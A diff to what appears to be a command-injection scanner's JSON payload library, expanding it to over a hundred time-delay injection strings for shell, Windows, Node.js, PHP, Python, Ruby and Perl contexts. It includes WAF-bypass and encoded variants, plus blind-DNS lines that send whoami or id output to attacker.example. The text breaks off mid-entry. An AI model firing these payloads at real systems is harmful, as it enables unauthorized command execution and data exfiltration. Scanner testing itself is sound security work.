@@ -1,56 +1,954 @@
 [
-  {"name": "linux_sleep",          "category": "linux-shell",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": ";sleep {N}"},
-  {"name": "linux_sleep_amp",      "category": "linux-shell",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "&&sleep {N}"},
-  {"name": "linux_sleep_pipe",     "category": "linux-shell",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "|sleep {N}"},
-  {"name": "linux_sleep_bg",       "category": "linux-shell",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": ";`sleep {N}`"},
-  {"name": "linux_sleep_subst",    "category": "linux-shell",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": ";$(sleep {N})"},
-  {"name": "linux_sleep_or",       "category": "linux-shell",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "||sleep {N}"},
-  {"name": "linux_sleep_newline",  "category": "linux-shell",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "%0asleep%20{N}"},
-  {"name": "linux_sleep_cr",       "category": "linux-shell",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "%0dsleep%20{N}"},
-  {"name": "linux_sleep_tab",      "category": "linux-shell",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": ";${IFS}sleep${IFS}{N}"},
-  {"name": "linux_sleep_brace",    "category": "linux-shell",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "{sleep,{N}}"},
-  {"name": "linux_sleep_redir",    "category": "linux-shell",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": ";sleep {N}>/dev/null"},
-  {"name": "linux_sleep_eval",     "category": "linux-shell",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": ";eval $'sleep {N}'"},
-  {"name": "linux_sleep_at",       "category": "linux-shell",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "@sleep {N}@"},
-
-  {"name": "windows_ping",         "category": "windows-cmd",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "& ping -n {N} 127.0.0.1"},
-  {"name": "windows_ping_amp",     "category": "windows-cmd",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "&& ping -n {N} 127.0.0.1"},
-  {"name": "windows_ping_pipe",    "category": "windows-cmd",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "| ping -n {N} 127.0.0.1"},
-  {"name": "windows_timeout",      "category": "windows-cmd",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "& timeout /T {N}"},
-  {"name": "windows_timeout_amp",  "category": "windows-cmd",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "&& timeout {N}"},
-  {"name": "powershell_sleep",     "category": "windows-cmd",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "; Start-Sleep -Seconds {N}"},
-  {"name": "powershell_sleep_amp", "category": "windows-cmd",  "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "; powershell.exe -c Start-Sleep -s {N}"},
-
-  {"name": "nodejs_setTimeout",    "category": "node-js",      "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "';require('child_process').execSync('sleep {N}');//"},
-  {"name": "nodejs_exec_sync",     "category": "node-js",      "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "';child_process.execSync('sleep {N}');//"},
-  {"name": "nodejs_template_lit",  "category": "node-js",      "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "${require('child_process').execSync('sleep {N}')}"},
-
-  {"name": "python_eval_sleep",    "category": "python-cli",   "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "';__import__('time').sleep({N});#"},
-  {"name": "python_eval_os",       "category": "python-cli",   "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "';__import__('os').system('sleep {N}');#"},
-  {"name": "python_format_sleep",  "category": "python-cli",   "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "{__import__('time').sleep({N})}"},
-  {"name": "python_jinja_sleep",   "category": "python-cli",   "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "{{ ''.__class__.__mro__[1].__subclasses__()[396]('sleep {N}',shell=True) }}"},
-
-  {"name": "ruby_eval_sleep",      "category": "perl-ruby",    "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "';system('sleep {N}');#"},
-  {"name": "ruby_backtick",        "category": "perl-ruby",    "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "`sleep {N}`"},
-  {"name": "ruby_erb",             "category": "perl-ruby",    "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "<%= `sleep {N}` %>"},
-
-  {"name": "perl_backtick",        "category": "perl-ruby",    "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "`sleep {N}`"},
-  {"name": "perl_system",          "category": "perl-ruby",    "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "; system('sleep {N}');"},
-
-  {"name": "php_passthru",         "category": "php-cli",      "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": ";passthru('sleep {N}');"},
-  {"name": "php_exec",             "category": "php-cli",      "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": ";exec('sleep {N}');"},
-  {"name": "php_backtick",         "category": "php-cli",      "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": ";`sleep {N}`;"},
-  {"name": "php_shell_exec",       "category": "php-cli",      "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": ";shell_exec('sleep {N}');"},
-
-  {"name": "waf_bypass_quotes",    "category": "waf-bypass",   "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": ";s\"l\"e\"e\"p {N}"},
-  {"name": "waf_bypass_concat",    "category": "waf-bypass",   "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": ";sl\\eep {N}"},
-  {"name": "waf_bypass_brace",     "category": "waf-bypass",   "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": ";${IFS%??}sleep${IFS%??}{N}"},
-  {"name": "waf_bypass_dollar",    "category": "waf-bypass",   "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": ";$0sleep $0{N}"},
-
-  {"name": "encoded_url",          "category": "encoded",      "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "%3bsleep%20{N}"},
-  {"name": "encoded_dbl",          "category": "encoded",      "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "%253bsleep%2520{N}"},
-  {"name": "encoded_unicode",      "category": "encoded",      "severity": "CRITICAL", "cvss": "9.8", "confirmable": true,  "payload": "%u003bsleep%u0020{N}"},
-
-  {"name": "blind_dns",            "category": "blind-dns",    "severity": "HIGH",     "cvss": "7.5", "confirmable": false, "payload": ";nslookup attacker.example;"},
-  {"name": "blind_dns_curl",       "category": "blind-dns",    "severity": "HIGH",     "cvss": "7.5", "confirmable": false, "payload": ";curl http://attacker.example/$(whoami);"}
+  {
+    "name": "linux_sleep_semi",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";sleep {N}"
+  },
+  {
+    "name": "linux_sleep_amp",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "&&sleep {N}"
+  },
+  {
+    "name": "linux_sleep_amp_sp",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "&& sleep {N}"
+  },
+  {
+    "name": "linux_sleep_pipe",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "|sleep {N}"
+  },
+  {
+    "name": "linux_sleep_pipe_sp",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "| sleep {N}"
+  },
+  {
+    "name": "linux_sleep_or",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "||sleep {N}"
+  },
+  {
+    "name": "linux_sleep_or_sp",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "|| sleep {N}"
+  },
+  {
+    "name": "linux_sleep_backtick",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";`sleep {N}`"
+  },
+  {
+    "name": "linux_sleep_subst",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";$(sleep {N})"
+  },
+  {
+    "name": "linux_sleep_subst_amp",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "&&$(sleep {N})"
+  },
+  {
+    "name": "linux_sleep_newline",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "%0asleep%20{N}"
+  },
+  {
+    "name": "linux_sleep_cr",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "%0dsleep%20{N}"
+  },
+  {
+    "name": "linux_sleep_crlf",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "%0d%0asleep%20{N}"
+  },
+  {
+    "name": "linux_sleep_ifs",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";${IFS}sleep${IFS}{N}"
+  },
+  {
+    "name": "linux_sleep_ifs9",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";${IFS%??}sleep${IFS%??}{N}"
+  },
+  {
+    "name": "linux_sleep_brace",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "{sleep,{N}}"
+  },
+  {
+    "name": "linux_sleep_redir",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";sleep {N}>/dev/null"
+  },
+  {
+    "name": "linux_sleep_redir2",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";sleep {N} 2>&1"
+  },
+  {
+    "name": "linux_sleep_eval",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";eval $'sleep {N}'"
+  },
+  {
+    "name": "linux_sleep_at",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "@sleep {N}@"
+  },
+  {
+    "name": "linux_sleep_dash",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "-sleep {N}"
+  },
+  {
+    "name": "linux_sleep_nl_literal",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "\nsleep {N}\n"
+  },
+  {
+    "name": "linux_sleep_dollar_paren_paren",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";$((sleep {N}))"
+  },
+  {
+    "name": "linux_sleep_quote",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';sleep {N};'"
+  },
+  {
+    "name": "linux_sleep_dquote",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "\";sleep {N};\""
+  },
+  {
+    "name": "linux_sleep_bash_c",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";bash -c 'sleep {N}'"
+  },
+  {
+    "name": "linux_sleep_sh_c",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";sh -c 'sleep {N}'"
+  },
+  {
+    "name": "linux_sleep_eof",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";sleep {N}#"
+  },
+  {
+    "name": "linux_sleep_combo",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "`sleep {N}`"
+  },
+  {
+    "name": "linux_sleep_nested",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "$(sleep {N})"
+  },
+  {
+    "name": "windows_ping",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "& ping -n {N} 127.0.0.1"
+  },
+  {
+    "name": "windows_ping_amp",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "&& ping -n {N} 127.0.0.1"
+  },
+  {
+    "name": "windows_ping_pipe",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "| ping -n {N} 127.0.0.1"
+  },
+  {
+    "name": "windows_ping_caret",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "&ping^ -n^ {N}^ 127.0.0.1"
+  },
+  {
+    "name": "windows_timeout",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "& timeout /T {N}"
+  },
+  {
+    "name": "windows_timeout_amp",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "&& timeout {N}"
+  },
+  {
+    "name": "windows_timeout_nobreak",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "& timeout /T {N} /NOBREAK"
+  },
+  {
+    "name": "powershell_sleep",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "; Start-Sleep -Seconds {N}"
+  },
+  {
+    "name": "powershell_sleep_short",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "; sleep {N}"
+  },
+  {
+    "name": "powershell_sleep_iex",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "; powershell.exe -c Start-Sleep -s {N}"
+  },
+  {
+    "name": "powershell_sleep_amp",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "& powershell -Command Start-Sleep {N}"
+  },
+  {
+    "name": "powershell_sleep_enc",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "8.0",
+    "confirmable": false,
+    "payload": "; powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAARABO"
+  },
+  {
+    "name": "windows_ping_newline",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "%0aping -n {N} 127.0.0.1"
+  },
+  {
+    "name": "windows_for_loop",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "& for /L %i in (1,1,{N}0000) do echo %i>nul"
+  },
+  {
+    "name": "nodejs_execsync",
+    "category": "node-js",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';require('child_process').execSync('sleep {N}');//"
+  },
+  {
+    "name": "nodejs_exec_var",
+    "category": "node-js",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';child_process.execSync('sleep {N}');//"
+  },
+  {
+    "name": "nodejs_template",
+    "category": "node-js",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "${require('child_process').execSync('sleep {N}')}"
+  },
+  {
+    "name": "nodejs_exec_cb",
+    "category": "node-js",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';require('child_process').exec('sleep {N}');//"
+  },
+  {
+    "name": "nodejs_spawnsync",
+    "category": "node-js",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';require('child_process').spawnSync('sleep',['{N}']);//"
+  },
+  {
+    "name": "nodejs_eval",
+    "category": "node-js",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';eval(\"require('child_process').execSync('sleep {N}')\");//"
+  },
+  {
+    "name": "nodejs_global",
+    "category": "node-js",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "${global.process.mainModule.require('child_process').execSync('sleep {N}')}"
+  },
+  {
+    "name": "nodejs_backtick_inj",
+    "category": "node-js",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "`;require('child_process').execSync('sleep {N}')`"
+  },
+  {
+    "name": "php_passthru",
+    "category": "php-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";passthru('sleep {N}');"
+  },
+  {
+    "name": "php_exec",
+    "category": "php-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";exec('sleep {N}');"
+  },
+  {
+    "name": "php_system",
+    "category": "php-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";system('sleep {N}');"
+  },
+  {
+    "name": "php_backtick",
+    "category": "php-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";`sleep {N}`;"
+  },
+  {
+    "name": "php_shell_exec",
+    "category": "php-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";shell_exec('sleep {N}');"
+  },
+  {
+    "name": "php_popen",
+    "category": "php-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";popen('sleep {N}','r');"
+  },
+  {
+    "name": "php_proc_open",
+    "category": "php-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";proc_open('sleep {N}',[],$p);"
+  },
+  {
+    "name": "php_pipe_system",
+    "category": "php-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "|system('sleep {N}')"
+  },
+  {
+    "name": "python_time_sleep",
+    "category": "python-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';__import__('time').sleep({N});#"
+  },
+  {
+    "name": "python_os_system",
+    "category": "python-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';__import__('os').system('sleep {N}');#"
+  },
+  {
+    "name": "python_subprocess",
+    "category": "python-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';__import__('subprocess').call(['sleep','{N}']);#"
+  },
+  {
+    "name": "python_format_sleep",
+    "category": "python-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "{__import__('time').sleep({N})}"
+  },
+  {
+    "name": "python_eval_sleep",
+    "category": "python-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';eval(\"__import__('time').sleep({N})\");#"
+  },
+  {
+    "name": "python_os_popen",
+    "category": "python-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';__import__('os').popen('sleep {N}').read();#"
+  },
+  {
+    "name": "python_jinja_sleep",
+    "category": "python-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "{{ ''.__class__.__mro__[1].__subclasses__()[396]('sleep {N}',shell=True) }}"
+  },
+  {
+    "name": "ruby_system",
+    "category": "perl-ruby",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';system('sleep {N}');#"
+  },
+  {
+    "name": "ruby_backtick",
+    "category": "perl-ruby",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "`sleep {N}`"
+  },
+  {
+    "name": "ruby_exec",
+    "category": "perl-ruby",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';exec('sleep {N}');#"
+  },
+  {
+    "name": "ruby_erb",
+    "category": "perl-ruby",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "<%= `sleep {N}` %>"
+  },
+  {
+    "name": "ruby_open_pipe",
+    "category": "perl-ruby",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';open('|sleep {N}');#"
+  },
+  {
+    "name": "perl_system",
+    "category": "perl-ruby",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "; system('sleep {N}');"
+  },
+  {
+    "name": "perl_open_pipe",
+    "category": "perl-ruby",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";open(F,'sleep {N}|');"
+  },
+  {
+    "name": "perl_exec",
+    "category": "perl-ruby",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "; exec('sleep {N}');"
+  },
+  {
+    "name": "waf_quotes",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";s\"l\"e\"e\"p {N}"
+  },
+  {
+    "name": "waf_squotes",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";s'l'e'e'p {N}"
+  },
+  {
+    "name": "waf_concat_bs",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";sl\\eep {N}"
+  },
+  {
+    "name": "waf_ifs_brace",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";${IFS%??}sleep${IFS%??}{N}"
+  },
+  {
+    "name": "waf_dollar_zero",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";$0 sleep {N}"
+  },
+  {
+    "name": "waf_glob",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";/bin/sl?ep {N}"
+  },
+  {
+    "name": "waf_glob2",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";/???/sl??p {N}"
+  },
+  {
+    "name": "waf_var_indirect",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";a=sl;b=eep;$a$b {N}"
+  },
+  {
+    "name": "waf_brace_expand",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";{s,l,e,e,p}\\ {N}"
+  },
+  {
+    "name": "waf_hex_echo",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";$(echo -e '\\x73\\x6c\\x65\\x65\\x70') {N}"
+  },
+  {
+    "name": "waf_tab_sep",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";sleep\t{N}"
+  },
+  {
+    "name": "waf_dollar_at",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";\"$@\"sleep {N}"
+  },
+  {
+    "name": "waf_uninit_var",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";sl${u}eep {N}"
+  },
+  {
+    "name": "waf_newline_comment",
+    "category": "waf-bypass",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";sleep {N}#comment"
+  },
+  {
+    "name": "encoded_url",
+    "category": "encoded",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "%3bsleep%20{N}"
+  },
+  {
+    "name": "encoded_dbl",
+    "category": "encoded",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "%253bsleep%2520{N}"
+  },
+  {
+    "name": "encoded_unicode",
+    "category": "encoded",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "%u003bsleep%u0020{N}"
+  },
+  {
+    "name": "encoded_amp",
+    "category": "encoded",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "%26%26sleep%20{N}"
+  },
+  {
+    "name": "encoded_pipe",
+    "category": "encoded",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "%7csleep%20{N}"
+  },
+  {
+    "name": "encoded_backtick",
+    "category": "encoded",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "%60sleep%20{N}%60"
+  },
+  {
+    "name": "encoded_subst",
+    "category": "encoded",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "%24%28sleep%20{N}%29"
+  },
+  {
+    "name": "encoded_nl_semi",
+    "category": "encoded",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "%0a%3bsleep%20{N}"
+  },
+  {
+    "name": "blind_dns_nslookup",
+    "category": "blind-dns",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "confirmable": false,
+    "payload": ";nslookup attacker.example;"
+  },
+  {
+    "name": "blind_dns_curl",
+    "category": "blind-dns",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "confirmable": false,
+    "payload": ";curl http://attacker.example/$(whoami);"
+  },
+  {
+    "name": "blind_dns_wget",
+    "category": "blind-dns",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "confirmable": false,
+    "payload": ";wget http://attacker.example/$(id);"
+  },
+  {
+    "name": "blind_dns_dig",
+    "category": "blind-dns",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "confirmable": false,
+    "payload": ";dig $(whoami).attacker.example;"
+  },
+  {
+    "name": "blind_dns_ping",
+    "category": "blind-dns",
+    "severity": "HIGH",
+    "cvss": "7.5",
+    "confirmable": false,
+    "payload": ";ping -c1 attacker.example;"
+  },
+  {
+    "name": "linux_sleep_amp_amp",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";; sleep {N}"
+  },
+  {
+    "name": "linux_sleep_nl_amp",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "%0a&&sleep {N}"
+  },
+  {
+    "name": "linux_sleep_paren",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "(sleep {N})"
+  },
+  {
+    "name": "linux_sleep_curly_exec",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "; { sleep {N}; }"
+  },
+  {
+    "name": "linux_sleep_eq",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "=;sleep {N}"
+  },
+  {
+    "name": "linux_sleep_proc_sub",
+    "category": "linux-shell",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";cat <(sleep {N})"
+  },
+  {
+    "name": "windows_ping_pipe_sp",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": " | ping -n {N} 127.0.0.1"
+  },
+  {
+    "name": "windows_choice",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "& choice /t {N} /d y /n"
+  },
+  {
+    "name": "powershell_sleep_pipe",
+    "category": "windows-cmd",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "| powershell Start-Sleep {N}"
+  },
+  {
+    "name": "nodejs_execfile",
+    "category": "node-js",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';require('child_process').execFileSync('sleep',['{N}']);//"
+  },
+  {
+    "name": "php_pcntl",
+    "category": "php-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": ";pcntl_exec('/bin/sleep',['{N}']);"
+  },
+  {
+    "name": "python_check_output",
+    "category": "python-cli",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
+    "confirmable": true,
+    "payload": "';__import__('subprocess').check_output(['sleep','{N}']);#"
+  },
+  {
+    "name": "ruby_spawn",
+    "category": "perl-ruby",
+    "severity": "CRITICAL",
+    "cvss": "9.8",
